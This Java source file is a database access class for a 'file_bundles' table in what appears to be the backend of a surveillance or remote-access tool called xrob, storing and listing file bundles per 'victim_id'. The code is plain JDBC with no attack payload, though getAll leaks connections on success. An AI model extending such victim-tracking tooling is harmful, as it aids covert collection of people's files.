package com.theah64.xrob.api.database.tables;

import com.theah64.xrob.api.database.Connection;
import com.theah64.xrob.api.models.FileBundle;

import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.List;

/**
 * Created by theapache64 on 18/9/16,4:36 PM.
 */
public class FileBundles extends BaseTable<FileBundle> {
    public static final String COLUMN_VICTIM_ID = "victim_id";
    private static final String TABLE_NAME_FILE_BUNDLES = "file_bundles";
    public static final String COLUMN_BUNDLE_HASH = "bundle_hash";

    private FileBundles() {
        super("file_bundles");
    }

    private static final FileBundles instance = new FileBundles();

    public static FileBundles getInstance() {
        return instance;
    }


    @Override
    public String addv3(FileBundle fileBundle) {
        String bundleId = null;
        final String addBundleQuery = "INSERT INTO file_bundles (victim_id,bundle_hash) VALUES (?,?);";
        final java.sql.Connection con = Connection.getConnection();

        //To track the success

        try {
            final PreparedStatement ps = con.prepareStatement(addBundleQuery, PreparedStatement.RETURN_GENERATED_KEYS);

            ps.setString(1, fileBundle.getVictimId());
            ps.setString(2, fileBundle.getBundleHash());

            if (ps.executeUpdate() == 1) {
                final ResultSet rs = ps.getGeneratedKeys();
                if (rs.first()) {
                    bundleId = rs.getString(1);
                }
                rs.close();
            }


            ps.close();

        } catch (SQLException e) {
            e.printStackTrace();
        } finally {
            try {
                con.close();
            } catch (SQLException e) {
                e.printStackTrace();
            }
        }

        return bundleId;
    }

    public List<FileBundle> getAll(String victimId) {
        List<FileBundle> fileBundles = null;
        final String query = "SELECT id, UNIX_TIMESTAMP(last_logged_at) AS unix_epoch, bundle_hash FROM file_bundles WHERE victim_id = ? AND is_active = 1 ORDER BY id DESC;";
        final java.sql.Connection con = Connection.getConnection();
        try {
            final PreparedStatement ps = con.prepareStatement(query);
            ps.setString(1, victimId);
            final ResultSet rs = ps.executeQuery();
            if (rs.first()) {
                fileBundles = new ArrayList<>();
                do {
                    final String id = rs.getString(COLUMN_ID);
                    final String bundleHash = rs.getString(COLUMN_BUNDLE_HASH);
                    final long syncedAt = rs.getLong(COLUMN_AS_UNIX_EPOCH);

                    try {
                        fileBundles.add(new FileBundle(id, null, syncedAt, bundleHash));
                    } catch (Exception e) {
                        e.printStackTrace();
                    }

                } while (rs.next());
            }
            rs.close();
            ps.close();
        } catch (SQLException e) {
            e.printStackTrace();
            try {
                con.close();
            } catch (SQLException e1) {
                e1.printStackTrace();
            }
        }
        return fileBundles;
    }
}
